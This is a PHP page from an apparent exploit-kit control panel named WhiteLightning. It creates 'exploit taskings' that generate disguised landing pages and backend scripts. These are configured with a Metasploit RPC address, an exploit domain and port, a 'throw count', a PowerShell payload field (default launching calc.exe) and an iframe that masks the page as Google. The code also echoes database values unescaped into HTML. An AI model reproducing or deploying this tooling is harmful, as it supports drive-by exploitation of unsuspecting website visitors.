<?php
	session_start();
	require_once ('includes/config.inc.php'); 
	require_once ('../e/config_e.inc.php');
	
	if (isset($_SESSION['name'])) {
		require_once (MYSQL);	
	}else{
		header("Location: login.php");
	}
	
	function get_random_string($valid_chars, $length){
		$random_string = "";
		$num_valid_chars = strlen($valid_chars);
		// repeat the steps until we've created a string of the right length
		for ($i = 0; $i < $length; $i++){
			$random_pick = mt_rand(1, $num_valid_chars);
			$random_char = $valid_chars[$random_pick-1];
			$random_string .= $random_char;
		}
		// return our finished random string
		return $random_string;
	}
	
if (isset($_POST['submit'])) { // Handle the form.	
	$trimmed = array_map('trim', $_POST);
	// Assume invalid values:
	$name = $iframe_flag = $debug_flag = $iframe_url = $iframe_title = $iframe_icon_url = $throw_count = FALSE;

	// Check for a valid name:
	if (name_reg($trimmed['name'])) {
		$name = mysqli_real_escape_string ($dbc, $trimmed['name']);
	}
	
	if ($trimmed['ps_payload']) {
		$ps_payload = mysqli_real_escape_string ($dbc, $trimmed['ps_payload']);
	}
	
	if ($_POST['throw_flag'] == 'True')
	{ // Delete the record.
		$throw_flag = 'yes';
		
		//echo "throw_count: " . $throw_count;
		if ($trimmed['throw_count']) {
			$throw_count = mysqli_real_escape_string ($dbc, $trimmed['throw_count']);
			//echo "throw_count: " . $throw_count;
		}
	} else { // No confirmation of deletion.
		$throw_flag = 'no';
		$throw_count = "no";
	}
	
	if ($_POST['enable_iframe'] == 'True')
	{ // Delete the record.
		$iframe_flag = 'yes';
		
		if (name_reg($trimmed['iframe_url'])) {
			$iframe_url = mysqli_real_escape_string ($dbc, $trimmed['iframe_url']);
		}
		if (name_reg($trimmed['iframe_title'])) {
			$iframe_title = mysqli_real_escape_string ($dbc, $trimmed['iframe_title']);
		}
		if (name_reg($trimmed['iframe_icon_url'])) {
			$iframe_icon_url = mysqli_real_escape_string ($dbc, $trimmed['iframe_icon_url']);
		}
	} else { // No confirmation of deletion.
		$iframe_flag = 'no';
		$iframe_url = 'no';
		$iframe_title = 'no';
		$iframe_icon_url = 'no';
	}
	
	if ($_POST['enable_debug'] == 'True') { // Delete the record.
		$debug_flag = 'yes';
	} else { // No confirmation of deletion.
		$debug_flag = 'no';
	}
	
	if ($name && $iframe_flag && $debug_flag && $throw_count) { // If everything's OK...
		$date = date("y-m-d");
		$time = date("H:i:s");
		$random_flag = true;
		$random_string = '';
		while($random_flag === true)
		{	
			$original_string = 'abcdefghijklmnopqrstuvwxz';
			$random_string = get_random_string($original_string, 6);
			
			// Make the query
			$q = "SELECT tasking_id FROM taskings WHERE random_string='" . $random_string . "'";
			$r = @mysqli_query ($dbc, $q); // Run the query.
			$num_rows = mysqli_num_rows($r);
			echo "$num_rows Rows\n";
			
			if($num_rows == 0)
			{
				$random_flag = false;
			}
		}
		
		$frontend_url = WL_URL . '/' . $random_string;
		$backend_url = WL_URL . '/' . $random_string . "-be.php";
		
		// Add the user to the database:
		$q = "INSERT INTO taskings (name, date, time, random_string, throw_count, frontend_url, backend_url, iframe_flag, iframe_url, iframe_title, iframe_icon_url, debug_flag) VALUES ('$name', '$date', '$time', '$random_string', '$throw_count', '$frontend_url', '$backend_url', '$iframe_flag', '$iframe_url', '$iframe_title', '$iframe_icon_url', '$debug_flag')";
		$r = mysqli_query ($dbc, $q) or trigger_error("Query: $q\n<br />MySQL Error: " . mysqli_error($dbc));

		if (mysqli_affected_rows($dbc) == 1) { // If it ran OK.
			$frontend_file_data = "<?php
define ('BACKEND_URL', '/".$random_string."-be.php');
";
			
			if ($_POST['enable_iframe'] == 'yes') { // Delete the record.
				$frontend_file_data .= "define ('IFRAME_FLAG', true);
define ('IFRAME_URL', '".$iframe_url."');
define ('IFRAME_TITLE', '".$iframe_title."');
define ('IFRAME_ICON_URL', '".$iframe_icon_url."');
";
			}else{
				$frontend_file_data .= "define ('IFRAME_FLAG', false);\n";
			}
			
			if ($_POST['enable_debug'] == 'yes') { // Delete the record.
				$frontend_file_data .= "define ('DEBUG_FLAG', true);\n";
			}else{
				$frontend_file_data .= "define ('DEBUG_FLAG', false);\n";	
			}
			
			$frontend_file_data .= "?>
";
			
			$frontend_file_data .= file_get_contents('/var/www/e/template-fe.php');
			//file_put_contents('/var/www/'. $random_string . '.php', $frontend_file_data);
			file_put_contents('/var/www/'. $random_string, $frontend_file_data);
			
			// --- Back End ---
			
			$frontend_file_data = "<?php
define ('MSGRPC_IP', '192.168.30.206');
define ('EXPLOIT_DOMAIN', 'blog.qu.gs');
define ('EXPLOIT_PORT', '805');
define ('WL_URL', '" . WL_URL . "');
define ('RAND_STR', '" . $random_string . "' );
define ('THROW_COUNT', '" . $throw_count . "');
define ('LOAD_PS_PAYLOAD', '" . $ps_payload . "');
";
			
			if ($_POST['enable_debug'] == 'yes') { // Delete the record.
				$frontend_file_data .= "define ('DEBUG_FLAG', true);\n";
			}else{
				$frontend_file_data .= "define ('DEBUG_FLAG', false);\n";	
			}
			
			$frontend_file_data .= "?>
";
			$frontend_file_data .= file_get_contents('/var/www/e/template-be.php');
			file_put_contents('/var/www/'. $random_string . '-be.php', $frontend_file_data);

		} else { // If it did not run OK.
			echo '<p class="error">could not be registered due to a system error. We apologize for any inconvenience. 6</p>';
		}	
	}
} // End of the main Submit conditional.

// --- END POST ---
?>

<html lang="en">
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>WhiteLightning -> Tasking</title>

    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/sb-admin.css" rel="stylesheet">
    <link href="css/tabs.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body>
    <div id="wrapper">
        <?php include('outline.php'); ?>
        <div id="page-wrapper">

            <div class="container-fluid">

                <!-- Page Heading -->
                <div class="row">
                    <div class="col-lg-12">
                        <h1 class="page-header">
                            Exploit Taskings
                        </h1>
                        <ol class="breadcrumb">
                            <li>
                                <i class="fa fa-dashboard"></i>  <a href="index.php">Dashboard</a>
                            </li>
                            <li class="active">
                                <i class="fa fa-edit"></i> Exploit Taskings
                            </li>
                        </ol>
                    </div>
                </div>
                <!-- /.row -->

				<div class="tabs">
					<ul class="tab-links">
						<li class="active"><a href="#tab1">Current Tasking</a></li>
						<li><a href="#tab2">Create Tasking</a></li>
					</ul>
				 
					<div class="tab-content">
						<div id="tab1" class="tab active">
							<div class="row">
								<div class="col-lg-12">
									<h2>Current Taskings</h2>
										<div class="table-responsive">
											<table class="table table-bordered table-hover table-striped">
												<thead>
													<tr>
														<th>ID</th>
														<th>Time Created</th>
														<th>Task Name</th>
														<th>Site</th>
														<th>iFrame URL</th>
														<th>iFrame Title</th>
														<th>Max Throws</th>
														<th>Debug</th>
													</tr>
												</thead>
												<script>
													function delete_rows(tasking_id, random_string){
														var x = confirm("Are you sure you want to remove tasking #" + tasking_id);
														if (x){
															$.ajax({
															type: "POST",
															url: 'includes/taskings_delete_rows.php',
															data:{action:random_string},
															success:function(html) {
																location.replace("tasking.php");
															}
															});
														}
													}
												</script>
												<?php 
													$q = "SELECT tasking_id, CONCAT_WS(' ', date, time) AS date_time, name, frontend_url, iframe_url, iframe_title, random_string, throw_count, debug_flag FROM taskings ORDER BY date_time DESC";
													$r = @mysqli_query ($dbc, $q); // Run the query.
													while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
														echo '<tbody><tr><tr class="warning">
															  <td>'.$row['tasking_id'].
															  '<button type="button" name="delete_row" onclick="delete_rows('.$row['tasking_id'].',\''.$row['random_string'].'\')" class="close" data-dismiss="modal" aria-hidden="true">×</button></td>
															  <td>'.$row['date_time'].'</td>
															  <td>'.$row['name'].'</td>
															  <td>'.$row['frontend_url'].'</td>
															  <td>'.$row['iframe_url'].'</td>
															  <td>'.$row['iframe_title'].'</td>
															  <td>'.$row['throw_count'].'</td>
															  <td>'.$row['debug_flag'].'</td></tr></tbody>';
													}
												?>
											</table>
										</div>
									</div>
								</div>
							</div>
							<div id="tab2" class="tab">
								<div class="row">
									<div class="col-lg-6">
										<h2>Create Tasking</h2>
										<form action="tasking.php" method="post">
											<div class="form-group">
												<label>Tasking Name</label>
												<input class="form-control" name="name" value="Test Payload" placeholder="Test Payload">
											</div>
											<div class="form-group">
												<label>Throw Count</label>
												<input class="form-control" name="throw_count" value="1" placeholder="1">
											</div>
											<div class="form-group">
												<label>Powershell Payload</label>
												<input class="form-control" name="ps_payload" value="Invoke-Item c:\windows\system32\calc.exe" placeholder="Invoke-Item c:\windows\system32\calc.exe">
											</div>
											<div class="form-group">
												<label>iFrame URL</label>
												<input class="form-control" name="iframe_url" value="http://www.google.com/" placeholder="http://www.google.com/">
											</div>
											<div class="form-group">
												<label>iFrame Title</label>
												<input class="form-control" name="iframe_title" value="Google" placeholder="Google">
											</div>
											<div class="form-group">
												<label>iFrame Icon URL</label>
												<input class="form-control" name="iframe_icon_url" value="https://www.google.com/images/google_favicon_128.png" placeholder="https://www.google.com/images/google_favicon_128.png">
											</div>
											<div class="form-group">
												<label>Options</label>
												<div class="checkbox">
													<label>
														<input type="checkbox" name="throw_flag" value="True" checked>Throw Exploits
													</label>
												</div>
												<div class="checkbox">
													<label>
														<input type="checkbox" name="enable_iframe" value="True" checked>iFrame to Website
													</label>
												</div>
												<div class="checkbox">
													<label>
														<input type="checkbox" name="enable_debug" value="True" checked>Enable Debug
													</label>
												</div>
											</div>
											<input type="submit" name="submit" value="Submit Button" id="Button" class="btn btn-default"/>
											<button type="reset" class="btn btn-default">Reset Button</button>
										</form>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
            </div>
            <!-- /.container-fluid -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->

    <!-- jQuery -->
    <script src="js/jquery.js"></script>
    <script src="js/tabs.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="js/bootstrap.min.js"></script>

</body>

</html>
